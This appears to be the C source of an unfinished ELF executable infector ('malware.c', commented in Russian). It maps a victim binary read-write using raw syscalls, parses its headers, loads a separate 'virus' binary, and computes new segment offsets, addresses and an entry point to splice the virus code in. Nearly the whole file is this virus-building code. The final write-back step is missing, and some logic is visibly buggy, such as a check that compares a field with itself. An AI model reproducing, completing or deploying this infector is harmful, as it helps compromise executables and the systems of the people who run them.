/* Compile: gcc malware.c -o malware */
/* Usage: ./malware */
#include <sys/mman.h>
#include <sys/stat.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <elf.h>

/* ничем не отличается от структуры Elf64_Phdr, определенной в elf.h,
   но почему-то компиляторуоказывается неизвестен размер такой структуры,
   из-за чего возникают ошибки компиляции */

typedef struct Elf64_Phdr_str {
    unsigned int          p_type;       /* Segment type */
    unsigned int          p_flags;      /* Segment flags */
    unsigned long long    p_offset;     /* Segment file offset */
    unsigned long long    p_vaddr;      /* Segment virtual address */
    unsigned long long    p_paddr;      /* Segment physical address */
    unsigned long long    p_filesz;     /* Segment size in file */
    unsigned long long    p_memsz;      /* Segment size in memory */
    unsigned long long    p_align;      /* Segment alignment */
} Elf64_Phdr_str;

/* созданная по аналогичным причинам структура заголовка секции */
typedef struct Elf64_Shdr_str {
    unsigned int          sh_name;      /* Section name (string tbl index) */
    unsigned int          sh_type;      /* Section type */
    long long             sh_flags;     /* Section flags */
    unsigned long long    sh_addr;      /* Section virtual addr at execution */
    unsigned long long    sh_offset;        /* Section file offset */
    long long             sh_size;      /* Section size in bytes */
    unsigned int          sh_link;      /* Link to another section */
    unsigned int          sh_info;      /* Additional section information */
    long long             sh_addralign;     /* Section alignment */
    long long             sh_entsize;       /* Entry size if section holds table */
} Elf64_Shdr_str;

/* глобальные переменные для возвращаемых значений функций
   fopen, fread, open, read, close и mmap*/
/* это единственный способ присвоить возвращаемое ассемблерным кодом
   значение сишной переменной - даже если локальные переменные объявлены в куче,
   компилятор сначала кладет адрес переменной в стек,
   и только затем присваивает ему значение. Нам это не подходит, поскольку неизвестно,
   куда именно в стеке будет записан адрес, а взаимодествовать
   со стеком вслепую = получить segfault*/

void* return_mmap_ptr = NULL;
int return_open_fd;
int return_close_val;
int return_read_count;

/* хранит размер открытого эльфе-жертвы, нужен для fread */
long opened_file_size;
long num_of_wrote_bytes;

void print_elf_header_field(  Elf64_Ehdr* header_ptr );

typedef struct new_offset_and_size {
    unsigned long long offset;
    unsigned long long filesz;
} new_offset_and_size;

/* вызывает stat */
void call_stat ( const char* path_name, struct stat *stat_struct ) {
    __asm__( "mov $4, %rax\n\t"
             "syscall\n\t");
}

/* вызывает mmap */
void* call_mmap ( void *address,
                  size_t length,
                  int protect,
                  int flags,
                  int filedes,
                  off_t offset ) {

    __asm__("push %rbx \n\t"
            "push %rcx \n\t"
            "push %rdx \n\t"
            "push %rbp \n\t"
            "push %r10 \n\t"
            "push %r14 \n\t"
            "push %r15 \n\t"

            "mov %r9, %r15 \n\t"
            "mov %rsi, %r13 \n\t"
            "mov %rdi, %r12 \n\t"
            "mov %ecx, %r14d \n\t"

            "movslq %r8d, %rbp \n\t"
            "movslq %edx, %rbx \n\t"
            "movslq %r14d, %r10 \n\t"
            "mov $0x9, %eax \n\t"

            "syscall \n\t"
            "movq %rax, return_mmap_ptr(%rip) \n\t"

            "pop %r15 \n\t"
            "pop %r14 \n\t"
            "pop %r10 \n\t"
            "pop %rbp \n\t"
            "pop %rdx \n\t"
            "pop %rcx \n\t"
            "pop %rbx \n\t"
            );

    return return_mmap_ptr;
}

/* вызывает open */
int call_open (const char *filename, int flags) {

    __asm__( "mov $2, %rax\n\t"
             "syscall\n\t"
             "movq %rax, return_open_fd(%rip) \n\t"
             );

    return return_open_fd;
}

long call_write(unsigned int fd, char *buf, size_t count) {
    __asm__( "mov $1, %rax\n\t"
             "syscall\n\t"
             "movq %rax, num_of_wrote_bytes(%rip) \n\t"
             );
    return num_of_wrote_bytes;
}
/* вызывает close */
int call_close (unsigned int fd) {

    __asm__( "mov $3, %rax\n\t"
             "syscall\n\t"
             "movq %rax, return_close_val(%rip) \n\t");

    return return_close_val;
}

/* вызывает read */
int call_read (unsigned int fd, char *buf, size_t count) {

    __asm__( "mov $0, %rax\n\t"
             "syscall\n\t"
             "movq %rax, return_read_count(%rip) \n\t"
             );
    return return_read_count;
}

/* мой вариант fopen */
/* основное отличие от библиотечного fopen состоит в том,
   что мой не принимает флаги, поскольку у меня файлы всегда будут
   открываться на чтение или запись */
void* call_fopen ( const char *filename ) {
    int fd = call_open( filename, O_RDWR );

    if ( fd < 0 ) {
        printf("fopen: Не удалось открыть файл, ошибка № %d\n",
               errno);
        return NULL;
    }

    struct stat mystruct;
    call_stat( filename, &mystruct );

    opened_file_size = mystruct.st_size;
    /* маппим файл в память */
    void* ptr = call_mmap( NULL, opened_file_size,
                           PROT_READ|PROT_WRITE, MAP_SHARED,
                           fd, 0 );

    if ( ( ptr == MAP_FAILED ) || ( ptr < 0 ) ) {
        printf("fopen: Mapping Failed, err number %d \n",
               errno);
        printf("fopen: mmap returned bad pointer: %p\n", ptr);
        return NULL;
    }
    return ptr;
}
/* мой вариант memcpy */
void* call_memcpy(void* dest, void* source, size_t n ) {

    char* d = (char*)dest;
    char* s = (char*)source;

    /* printf("call_memcpy: dest %p \n", dest); */
    /* printf("call_memcpy: source %p \n", source); */

    for (int i = 0; i < n; i++ ) {
        *d = *s;
        d++;
        s++;
    }
    /* printf("return from call_memcpy \n"); */
}

void* call_fread ( void* ptr_sourse, size_t count, size_t bytes,
                   void* ptr_dest ) {

    long readed_bytes = 0;

    for( int i = 0; i < count; i++ ) {

        /* страховка, чтоб не прочитать больше, чем есть в файле */
        if( readed_bytes >= opened_file_size ) {
            return ptr_sourse;
        }

        /* memcpy( ptr_dest, ptr_sourse, bytes ); */
        call_memcpy( ptr_dest, ptr_sourse, bytes );

        ptr_dest = ptr_dest + bytes;
        ptr_sourse = ptr_sourse + bytes;
        readed_bytes = readed_bytes + bytes;
    }
    return ptr_sourse;
}

/* распечатывает все поля заголовка эльфа */
void print_elf_header_field(  Elf64_Ehdr* header_ptr ) {
    Elf64_Ehdr header = *header_ptr;

    printf("print elf header: \n");

    printf("header.e_type : %d\n", header.e_type);
    printf("header.e_machine : %d\n", header.e_machine);
    printf("header.e_version : %ud\n", header.e_version);
    printf("header.e_entry : %p\n", (void*)header.e_entry);
    printf("header.e_phoff : %lu\n", header.e_phoff);
    printf("header.e_shoff : %lu\n", header.e_shoff);
    printf("header.e_flags : %d\n", header.e_flags);
    printf("header.e_ehsize : %d\n", header.e_ehsize);
    printf("header.e_phentsize : %d\n", header.e_phentsize);
    printf("header.e_phnum : %d\n", header.e_phnum);
    printf("header.e_shentsize : %d\n", header.e_shentsize);
    printf("header.e_shnum : %d\n", header.e_shnum);
    printf("header.e_shstrndx : %d\n", header.e_shstrndx);

    printf("\n");
}

/* печатает все поля заголовка программы - заголовков самого исполняемого кода программы*/
void print_programm_header( Elf64_Phdr_str * programm_header_ptr ) {
    struct Elf64_Phdr_str programm_header = *programm_header_ptr;

    printf("print programm header: \n");

    printf("programm_header.p_type : %d \n", programm_header.p_type);
    printf("programm_header.p_flags : %d \n", programm_header.p_flags);
    printf("programm_header.p_offset : %llu \n", programm_header.p_offset);
    printf("programm_header.p_filesz : %llu \n", programm_header.p_filesz);
    printf("programm_header.p_memsz : %llu \n", programm_header.p_memsz);
    printf("programm_header.p_vaddr : %p \n",  (void*)programm_header.p_vaddr);
    printf("programm_header.p_paddr : %p \n",  (void*)programm_header.p_paddr);
    printf("programm_header.p_align : %llu \n", programm_header.p_align);

    printf("\n");
}

void print_all_programm_headers(Elf64_Phdr_str * program_header_array, int n ) {
    for (int i = 0; i < n; i++ ) {
        print_programm_header( program_header_array );
        program_header_array++;
    }
}

/* печатает все поля заголовка секции - весь код программы поделен на секции,
   у каждой есть заголовок */
void print_section_header( Elf64_Shdr_str *section_header_ptr ) {
    struct Elf64_Shdr_str section_header = *section_header_ptr;

    printf("print section header: \n");

    printf("section_header.sh_name : %d \n", section_header.sh_name);
    printf("section_header.sh_type : %d \n", section_header.sh_type);
    printf("section_header.sh_flags : %lld \n", section_header.sh_flags);

    printf("section_header.sh_offset : %llu \n", section_header.sh_offset);
    printf("section_header.sh_size : %llu \n", section_header.sh_size);

    printf("section_header.sh_addr : %p \n",  (void*)section_header.sh_addr);
    printf("section_header.sh_link : %d \n", section_header.sh_link);
    printf("section_header.sh_info : %d \n", section_header.sh_info);

    printf("section_header.sh_addralign : %lld \n", section_header.sh_addralign);
    printf("section_header.sh_entsize : %lld \n", section_header.sh_entsize);

    printf("\n");
}

void print_all_section_headers(Elf64_Shdr_str * section_header_array, int n ) {
    for (int i = 0; i < n; i++ ) {
        print_section_header( section_header_array );
        section_header_array++;
    }
}

void print_new_offset_and_size( new_offset_and_size *data_array, int n ) {

    printf("print new offsets and sizes of programm segments: \n");
    for (int i = 0; i < n; i++ ) {
        printf("new offset : %llu \n",data_array[i].offset );
        printf("new size : %llu \n", data_array[i].filesz);
        printf("\n");
    }
}

/* читает заголовок эльфа из памяти  */
void read_elf_header( void* mmaped_file_ptr, Elf64_Ehdr* header_struct) {
    call_fread( mmaped_file_ptr, 1, sizeof(Elf64_Ehdr), header_struct );
}

/* читает заголовок секции из памяти  */
void read_section_header( void* mmaped_file_ptr, Elf64_Shdr_str* header_struct) {
    call_fread( mmaped_file_ptr, 1, sizeof(Elf64_Shdr_str), header_struct );
}

/* читает заголовок программы из памяти  */
void read_program_header( void* mmaped_file_ptr, Elf64_Phdr_str* header_struct) {
    call_fread( mmaped_file_ptr, 1, sizeof(Elf64_Phdr_str), header_struct );
}

/* читает остальной код  */
void read_rest_code( void* mmaped_file_ptr, char* buf, int n) {
    call_fread( mmaped_file_ptr, n, sizeof(char), buf );
}

/* позволяет пропустить заданное количество символов, сдвигая указатель  */
void* miss_symbols( void* mmaped_file_ptr, long n) {
    return mmaped_file_ptr + n;
}

/* прибавляет n байт к смещению в каждом заголовке программы */
Elf64_Phdr_str* add_offset_to_programs ( int n, unsigned long long offset,
                                         Elf64_Phdr_str* array ) {
    struct Elf64_Phdr_str header;
    for( int i = 0; i < n; i++) {
        header = array[i];
        header.p_offset = header.p_offset + offset;
        array[i] = header;
    }
}

/* выгружает все заголовки кода в массив */
Elf64_Phdr_str* get_program_headers ( void* mmaped_file_ptr, int n,
                                      Elf64_Phdr_str* array_headers ) {

    call_fread( mmaped_file_ptr, n, sizeof(Elf64_Phdr_str),
                array_headers );
    return array_headers;
}

Elf64_Shdr_str* get_section_headers ( void* mmaped_file_ptr, int n,
                                      Elf64_Shdr_str* array_headers ) {

    call_fread( mmaped_file_ptr, n, sizeof(Elf64_Shdr_str),
                array_headers );
    return array_headers;
}

/* ищет заголовок последнего сегмента в массиве заголовков */
/* последним сегментом считается тот, который находится дальше всех от начала файла и */
/* имеет самый большой размер */
Elf64_Phdr_str * find_last_segment( int n, Elf64_Phdr_str * headers_array,
                                    Elf64_Phdr_str * program_header_last_segment) {

    struct Elf64_Phdr_str program_header;

    for( int i = 0; i < n; i++) {
        program_header = headers_array[i];

        if (i == 0) {
            *program_header_last_segment = program_header;

        } else if (  (*program_header_last_segment).p_offset +
                     (*program_header_last_segment).p_filesz
                     <= program_header.p_offset +  program_header.p_filesz ) {

            *program_header_last_segment = program_header;
        }
    }
    return program_header_last_segment;
}

/* сортирует пузырьком заголовки программы по размеру сегментов, которые они описывают
   (от максимального к минимальному) */
Elf64_Phdr_str* sort_program_headers (int n, Elf64_Phdr_str* array) {
    struct Elf64_Phdr_str a;
    struct Elf64_Phdr_str b;

    void bubble_sort( ) {
        for( int i = 0; i < n - 1; i++) {
            a = array[i];
            b = array[i + 1];
            if ( a.p_filesz < b.p_filesz ) {
                array[i] = b;
                array[i+1] = a;

            }
        }
    }

    Elf64_Phdr* check_array (int n, Elf64_Phdr_str* array) {
        for( int i = 0; i < n - 1; i++) {
            a = array[i];
            b = array[i + 1];

            if ( a.p_filesz < b.p_filesz ) {
                bubble_sort();
                check_array (n, array);
            }
        }
    }
    check_array (n, array);
    return array;
}

int count_new_offset_and_size_of_segments ( new_offset_and_size*
                                            new_array,
                                            Elf64_Phdr_str*
                                            array_program_headers,
                                            int n ) {
    Elf64_Phdr_str table_header;
    Elf64_Phdr_str cur_header;
    new_offset_and_size new_data;
    long long old_filesz;
    int j = 0;

    /* считает новое смещение и размер сегмента, который описывает заголовок */
    int count( new_offset_and_size* new_array,
               long long* cur_offset,
               long long* cur_filesz ) {

        printf("cur_offset %llu \n", *cur_offset);
        printf("cur_filesz %llu \n", *cur_filesz);

        for ( int i = 0; i <= j; i++ ) {

            /* printf("*cur_offset + *cur_filesz = %lld table_header.p_offset %lld \n", */
            /*        *cur_offset + *cur_filesz, table_header.p_offset); */

            if ( ( ( *cur_offset >= new_array[i].offset ) &&
                   ( ( *cur_offset + *cur_filesz ) <=
                     ( new_array[i].offset + new_array[i].filesz) ) ) ||
                 ( ( *cur_offset >= table_header.p_offset ) &&
                   ( ( *cur_offset + *cur_filesz ) <=
                     ( table_header.p_offset + table_header.p_filesz) ) ) ) {

                printf("блоки полностью накладваются друг на друга \n \n");

                *cur_filesz = -1;
                return *cur_filesz;

                /* смещения не равны */
            } else if ( ( *cur_offset + *cur_filesz > table_header.p_offset ) &&
                        ( *cur_offset < table_header.p_offset ) ) {
                printf("смещения не равны, сегмент начинается до таблицы заголовков\n \n");
                if ( *cur_offset == 0 ) {
                    *cur_offset = table_header.p_offset + table_header.p_filesz;
                    *cur_filesz = *cur_filesz - *cur_offset;
                } else {
                *cur_filesz = table_header.p_offset - *cur_offset;

                }
            } else if ( ( *cur_offset + *cur_filesz > new_array[i].offset ) &&
                        ( *cur_offset < new_array[i].offset ) ) {
                printf("смещения не равны \n");
                printf("сегмент начинается до текущего сегмента и накладывается на него\n \n");
                *cur_filesz = new_array[i].offset - *cur_offset;

            } else if ( ( table_header.p_offset + table_header.p_filesz > *cur_offset )
                        &&
                        ( *cur_offset + *cur_filesz > table_header.p_offset ) ) {
                printf("смещения не равны \n");
                printf("сегмент начинается до таблицы заголовков, накладывается на таблицу\n \n");

                old_filesz = *cur_filesz;

                if ( ( table_header.p_offset + ( *cur_offset ) ) >
                     ( *cur_filesz + *cur_offset ) ) {

                    *cur_filesz = ( table_header.p_offset + *cur_offset ) -
                        ( *cur_filesz + *cur_offset );
                    *cur_offset = *cur_offset + old_filesz;

                } else {
                    *cur_filesz = ( *cur_filesz + *cur_offset ) -
                        ( table_header.p_offset + *cur_offset );
                    *cur_offset = *cur_offset + old_filesz;
                }

            } else if ( ( new_array[i].offset + new_array[i].filesz > *cur_offset ) &&
                        ( *cur_offset + *cur_filesz > new_array[i].offset ) ) {
                printf("смещения не равны \n");
                printf("сегмент начинается внутри текущего сегмента\n \n");
                old_filesz = *cur_filesz;

                if ( ( new_array[i].offset + ( *cur_offset ) ) >
                     ( *cur_filesz + *cur_offset ) ) {
                    *cur_filesz = ( ( new_array[i].offset + ( *cur_offset ) ) -
                                    ( *cur_filesz + *cur_offset ) );
                    *cur_offset = *cur_offset + old_filesz;

                } else {
                    *cur_filesz = ( ( *cur_filesz + *cur_offset ) -
                                    ( new_array[i].offset + ( *cur_offset ) ) );
                    *cur_offset = ( *cur_offset ) + old_filesz;
                }

            } else if ( ( table_header.p_offset == *cur_offset ) ||
                    ( new_array[i].offset == *cur_offset ) ) {

                printf(" смещения равны \n \n");
                if ( table_header.p_filesz < *cur_filesz ) {
                    *cur_offset = *cur_offset + *cur_filesz;
                    *cur_filesz = *cur_filesz - table_header.p_filesz;

                } else if ( new_array[i].filesz < *cur_filesz )  {
                    *cur_offset = *cur_offset + new_array[i].filesz;
                    *cur_filesz = *cur_filesz - new_array[i].filesz;
                }
            }
        }
        return 0;
    }

    table_header = array_program_headers[0];

    sort_program_headers (n, array_program_headers);

    printf("sorted program headers array : \n");
    print_all_programm_headers(array_program_headers, n );

    /* printf("cur_offset %p \n", cur_offset); */
    /* printf("cur_filesz %p \n", cur_filesz); */

    for ( int i = 0; i < n; i++ ) {

        long long cur_filesz;
        long long cur_offset;

        if ( ( array_program_headers[i].p_type != 6 ) &&
             ( array_program_headers[i].p_type != 0 ) ) {

            cur_offset = array_program_headers[i].p_offset;
            cur_filesz = array_program_headers[i].p_filesz;

            /* printf("cur_offset before %llu \n", cur_offset); */
            /* printf("cur_filesz before %llu \n", cur_filesz); */

            count( new_array, &cur_offset, &cur_filesz );

            /* printf("здесь \n"); */
            if ( ( cur_offset > 0 ) && ( cur_filesz > 0 ) ) {

                /* printf("cur_offset after %lld \n", cur_offset); */
                /* printf("cur_filesz after %lld \n \n", cur_filesz); */

                new_array[j].offset = cur_offset;
                new_array[j].filesz = cur_filesz;
                j++;
            }
        }
    }
    return j;
}

void* count_new_addr (void* ptr, long offset) {
    return ptr + offset;
}

/* сортирует пузырьком заголовки программы по виртуальным адресам сегментов,
   которые они описывают (от минимального к максимальному) */
Elf64_Phdr_str* sort_program_headers_by_vaddr (int n, Elf64_Phdr_str* array) {
    struct Elf64_Phdr_str a;
    struct Elf64_Phdr_str b;

    void bubble_sort( ) {
        for( int i = 0; i < n - 1; i++) {
            a = array[i];
            b = array[i + 1];
            if ( a.p_vaddr > b.p_vaddr ) {
                array[i] = b;
                array[i+1] = a;

            }
        }
    }

    Elf64_Phdr* check_array (int n, Elf64_Phdr_str* array) {
        for( int i = 0; i < n - 1; i++) {
            a = array[i];
            b = array[i + 1];

            if ( a.p_vaddr > b.p_vaddr ) {
                bubble_sort();
                check_array (n, array);
            }
        }
    }
    check_array (n, array);
    return array;
}

/* считает новые виртуальные адреса для сегментов кода */
/* заголовки сегментов обязательно должны быть отсортированы по виртуальным адресам */
/* (от меньшего к большему) */
Elf64_Phdr_str* change_vaddrs_in_program_headers ( Elf64_Phdr_str* array,
                                                   long long vaddr,
                                                   long n ) {
    long long old_vaddr;
    int i = 0;

    /* пропускаем заголовки, которые описывают сегменты с виртуальным адресом 0 */
    for (int j = 0; j < n; j++) {
        if ( ( array[i].p_type != 0 ) && ( array[i].p_vaddr != 0 ) ) {
            break;
        }
        i++;
    }
    /* пересчитываем вирутальный адрес */
    for ( i; i < n; i++) {
        /* созраняем старый адрес, он нужен для подсчета
           соотноешния между двумя сегментами */
        old_vaddr = array[i].p_vaddr;

        if ( array[i].p_type != 0 )  {
            /* если вирутальный и физический адреса одинаковые, заменяем оба */
            if ( array[i].p_vaddr == array[i].p_vaddr ) {
                array[i].p_vaddr = vaddr;
                array[i].p_paddr = vaddr;

            } else {
                array[i].p_vaddr = vaddr;
            }
        }
       /* виртуальный адрес считается как соотношение
          между текущим сегментом и следующим + новый адрес */
        /* так можно посчитать на каком расстоянии находятся
           друг от друга два сегмента в памяти, а затем использовать
           переданный vaddr как смещение */
        if ( i != n - 1 ) {
            vaddr = vaddr + (array[i+1].p_vaddr - old_vaddr);
        }
    }
        return array;
}

int test_change_vaddrs_in_program_headers ( Elf64_Phdr_str* array,
                                            long long vaddr,
                                            long n ) {
    sort_program_headers_by_vaddr(n, array);

    printf("print prigram headers with old vaddrs : \n");
    print_all_programm_headers( array, n );

    printf("begin vaddr %llx \n", vaddr);
    change_vaddrs_in_program_headers ( array, vaddr, n );
    printf("print program headers with new vaddrs : \n");
    print_all_programm_headers( array, n );

}

/* int add_headers_to_file( void* file_ptr, */
/*                          Elf64_Ehdr* victim_elf_header_ptr, */
/*                          Elf64_Phdr_str* victim_array_program_headers, */
/*                          int sizeof_array1, */
/*                          Elf64_Phdr_str* virus_array_program_headers, */
/*                          int sizeof_array2 ) { */

/*     void* new_ptr; */

/*     new_ptr = call_fread( victim_elf_header_ptr, 1, sizeof( Elf64_Ehdr),  file_ptr); */
/*     new_ptr = call_fread( victim_array_program_headers, 1, */
/*                           sizeof_array1, */
/*                           new_ptr); */
/*     new_ptr = call_fread(  virus_array_program_headers, 1, */
/*                            sizeof_array2, */
/*                            new_ptr); */
/* } */

/* редактирует заголовок первого сегмента кода жертвы, а так же все последующие */
/* поскольку к заголовкам жертвы добавятся заголовки вируса,
   то весь код жертвы будет смещен ровно ра назмер добавленных заголовков */
/* следовательно, нужно увеличить размер первого блока кода и поправить
   смещения и адреса у всех остальных заголовков, описывающих код */
Elf64_Phdr_str* edit_header_of_first_code_block( Elf64_Phdr_str* array_program_headers,
                                                 Elf64_Phdr_str* virus_table_header_ptr,
                                                 int n ) {
    /* сортируем массив заголовков так,
       чтоб блок кода с наименьшим адресом оказался первым */
    sort_program_headers_by_vaddr( n, array_program_headers );
    Elf64_Phdr_str virus_table_header = *virus_table_header_ptr;
    Elf64_Phdr_str first_code_block_header;
    first_code_block_header.p_type = 0;

    /* ищем заголовок, описывающий первый сегмент кода */
    for ( int i = 0; i < n; i++ ) {
        if ( ( array_program_headers[i].p_type != 0 ) &&
             ( array_program_headers[i].p_offset == 0 ) &&
             ( array_program_headers[i].p_vaddr != 0 ) ) {
            first_code_block_header = array_program_headers[i];

            /* увеличили размер сегмента на тот объем памяти, который потребуется для
               таблицы заголовков */
            /* только помним, что в файл-жертву войдут все заголовки вируса,
               кроме заголовка самой таблицы заголовков, а 1 заголовко занимает
               56 байт на 64-разрядной системе */
            first_code_block_header.p_filesz += ( virus_table_header.p_filesz - 56 );
            first_code_block_header.p_memsz += ( virus_table_header.p_memsz - 56 );

            array_program_headers[i] = first_code_block_header;
            break;
        }
    }

    /* теперь редактируем все остальные заголовки программы - весь код жертвы
       сместится ровно на столько байт, сколько занимают заголовки вируса */
    /* нужно скорректировать физический и виртуальные адреса,
       а так же смещение в файле */

     for ( int i = 0; i < n; i++ ) {
        if ( ( array_program_headers[i].p_type != 0 ) &&
             ( array_program_headers[i].p_type != 6 ) &&
             ( array_program_headers[i].p_offset != 0 ) &&
             ( array_program_headers[i].p_vaddr != 0 ) ) {

            array_program_headers[i].p_vaddr += virus_table_header.p_memsz;
            array_program_headers[i].p_paddr += virus_table_header.p_filesz;
            array_program_headers[i].p_offset += virus_table_header.p_filesz - 56;
        }
     }

    return array_program_headers;
}

char* clear_buf (char* buf, long size ) {
    for ( int i = 0; i < size; i++ ) {
        buf[i] = 0;
    }
    return buf;
}

int test_call_write() {
    int fd = call_open("test.txt", O_RDWR);

    if ( fd < 0 ) {
        printf("call_write error\n");
    }
    char buf[12] =  "some string\n";
    call_write( fd, buf, 12);
}

int test_edit_header_of_first_code_block ( Elf64_Phdr_str* array,
                                           Elf64_Phdr_str* header_table,
                                           int n ) {

    print_programm_header( header_table );

    sort_program_headers_by_vaddr( n, array );

    printf("print program headers BEFORE change : \n");
    print_all_programm_headers( array, n );

    edit_header_of_first_code_block(array, header_table, n );

    printf("print program headers AFTER change : \n");
    print_all_programm_headers( array, n );

}
/* редактирует заголовок эльфа */
/* указывает новую точку входа, смещение до таблицы секций,
   количество заголовков секций и программ */
Elf64_Ehdr* edit_elf_header( Elf64_Ehdr* elf_header_ptr,
                             int new_amount_of_program_headers,
                             int new_amount_of_section_headers,
                             int new_section_table_offset,
                             long long new_entry_point ) {
    Elf64_Ehdr elf_header = *elf_header_ptr;
    elf_header.e_entry = new_entry_point;
    elf_header.e_shoff = new_section_table_offset;
    elf_header.e_phnum = new_amount_of_program_headers;
    elf_header.e_shnum = new_amount_of_section_headers;

    *elf_header_ptr = elf_header;
    return elf_header_ptr;
}

int recombine_elf( void* victim_file_ptr,
                   void* virus_file_ptr,
                   Elf64_Ehdr* victim_elf_header_ptr,
                   Elf64_Ehdr* virus_elf_header_ptr,
                   Elf64_Phdr_str* victim_array_program_headers,
                   Elf64_Phdr_str* virus_array_program_headers,
                   Elf64_Shdr_str* victim_array_section_headers,
                   Elf64_Shdr_str* virus_array_section_headers ) {

    Elf64_Ehdr victim_elf_header = *victim_elf_header_ptr;
    long victim_amount_of_program_headers = victim_elf_header.e_phnum;
    long victim_amount_of_section_headers = victim_elf_header.e_shnum;
    long victim_program_table_offset = victim_elf_header.e_phoff;
    long victim_sections_table_offset = victim_elf_header.e_shoff;

    Elf64_Ehdr virus_elf_header = *virus_elf_header_ptr;
    long virus_amount_of_program_headers = virus_elf_header.e_phnum;
    long virus_amount_of_section_headers = virus_elf_header.e_shnum;
    long virus_program_table_offset = virus_elf_header.e_phoff;
    long virus_sections_table_offset = victim_elf_header.e_shoff;

    /* считаем, где кончается таблица заголовокв программы */
    long victim_table_program_headers_end = ( victim_program_table_offset +
                                              victim_amount_of_program_headers *
                                              sizeof(Elf64_Phdr_str) );

    /* выгружаем код вируса */
    long virus_table_program_headers_end = ( virus_program_table_offset +
                                             virus_amount_of_program_headers *
                                             sizeof(Elf64_Phdr_str) );

    /* находим заголовок последнего сегмента кода жертвы */
    Elf64_Phdr_str victim_last_segment_header;
    find_last_segment( victim_amount_of_program_headers,
                       victim_array_program_headers,
                       &victim_last_segment_header );

    long victim_last_segment_end = victim_last_segment_header.p_offset + victim_last_segment_header.p_filesz;
    /* считаем, сколько байт занимает код от таблицы заголовков программы до точки,
       в которую будем писать вирус */
    long first_code_block_size = victim_last_segment_end - victim_table_program_headers_end;
    /* выделяем буфер под этот код */
    char from_last_header_to_point[first_code_block_size];

    /* считаем, сколько байт занимает код от точки, в которую будем писать вирус,
       до таблицы заголовков секций */
    long second_code_block_size = victim_sections_table_offset - victim_last_segment_end;
    /* выделяем буфер под этот блок кода */
    char from_point_to_sections_header[second_code_block_size];

    /* сливаем код в эти буфера */
    void* first_code_block_ptr = miss_symbols( victim_file_ptr,
                                               victim_table_program_headers_end );
    call_fread(first_code_block_ptr, 1, first_code_block_size,
               from_last_header_to_point );

    void* second_code_block_ptr = miss_symbols( victim_file_ptr,
                                                victim_last_segment_end );
    call_fread(second_code_block_ptr, 1, second_code_block_size,
               from_point_to_sections_header );

    long virus_code_block_size = ( virus_sections_table_offset -
                                   virus_table_program_headers_end );
    char buf_virus_code[virus_code_block_size];

    void* virus_code_block_ptr = miss_symbols( virus_file_ptr,
                                               virus_table_program_headers_end );
    call_fread(virus_code_block_ptr, 1, virus_code_block_size,
               buf_virus_code );

    test_call_write();
    /* test_edit_header_of_first_code_block ( victim_array_program_headers, */
    /*                                        &virus_array_program_headers[0], */
    /*                                        victim_amount_of_program_headers ); */

    /* test_change_vaddrs_in_program_headers( virus_array_program_headers, */
    /*                                        victim_last_segment_header.p_vaddr +  victim_last_segment_header.p_memsz, */
    /*                                        virus_amount_of_program_headers ); */
    /* printf( " e_entry %p \n", (void*)victim_elf_header.e_entry ); */
}

int main ( int argc, const char **argv ) {

    Elf64_Ehdr elf_header;

    /* открываем файл  */
    void* file_ptr = call_fopen ( argv[1] );
    if ( NULL == file_ptr ) {
        return -1;
    }
    read_elf_header( file_ptr, &elf_header);
    print_elf_header_field( &elf_header );

    /* высчитываем, сколько байт нужно пропустить,
       чтоб добраться до таблицы заголвоков */
    long program_table_offset = elf_header.e_phoff;
    long amount_of_program_headers = elf_header.e_phnum;
    void* prog_header_ptr = miss_symbols(file_ptr, program_table_offset);


    /* выгружаем все заголовки программы в массив */
    Elf64_Phdr_str array_program_headers [amount_of_program_headers];
    /* new_offset_and_size array_program_headers_data [amount_of_program_headers - 1]; */
    get_program_headers ( prog_header_ptr, amount_of_program_headers,
                          array_program_headers );

    /* высчитываем, сколько байт нужно пропустить,
       чтоб добраться до таблицы секций */
    long section_table_offset = elf_header.e_shoff;
    void* section_header_ptr = miss_symbols(file_ptr, section_table_offset);

    /* выгружаем все заголовки секций в массив */
    Elf64_Shdr_str array_section_headers [elf_header.e_shnum];
    get_section_headers ( section_header_ptr, elf_header.e_shnum,
                          array_section_headers );

    /* print_all_section_headers(array_section_headers, elf_header.e_shnum ); */

    /* ----------------- */
    /* теперь вытаксиваем код вируса */

    Elf64_Ehdr virus_elf_header;

    /* открываем файл вируса */
    void* virus_file_ptr = call_fopen ( "virus" );
    if ( NULL == virus_file_ptr ) {
        return -1;
    }

    read_elf_header( virus_file_ptr, &virus_elf_header);
    /* printf("virus header : \n"); */
    /* print_elf_header_field( &virus_elf_header ); */


    long virus_program_table_offset = virus_elf_header.e_phoff;
    long amount_of_virus_program_headers = virus_elf_header.e_phnum;
    void* virus_prog_header_ptr = miss_symbols( virus_file_ptr,
                                                virus_program_table_offset );

    /* выгружаем все заголовки программы вируса в массив */
    Elf64_Phdr_str virus_array_program_headers [amount_of_virus_program_headers];
    get_program_headers ( virus_prog_header_ptr, amount_of_virus_program_headers,
                          virus_array_program_headers );

    /* print_all_programm_headers(virus_array_program_headers, virus_elf_header.e_phnum ); */

    /* высчитываем, сколько байт нужно пропустить,
       чтоб добраться до таблицы секций вируса */
    long virus_section_table_offset = virus_elf_header.e_shoff;
    void* virus_section_header_ptr = miss_symbols(virus_file_ptr,
                                                  virus_section_table_offset);

    /* выгружаем все заголовки секций вируса в массив */
    Elf64_Shdr_str virus_array_section_headers [virus_elf_header.e_shnum];
    get_section_headers ( virus_section_header_ptr, virus_elf_header.e_shnum,
                          virus_array_section_headers );

    recombine_elf( file_ptr,
                   virus_file_ptr,
                   &elf_header, &virus_elf_header,
                   array_program_headers,
                   virus_array_program_headers,
                   array_section_headers,
                   virus_array_section_headers );

    return 0;
}
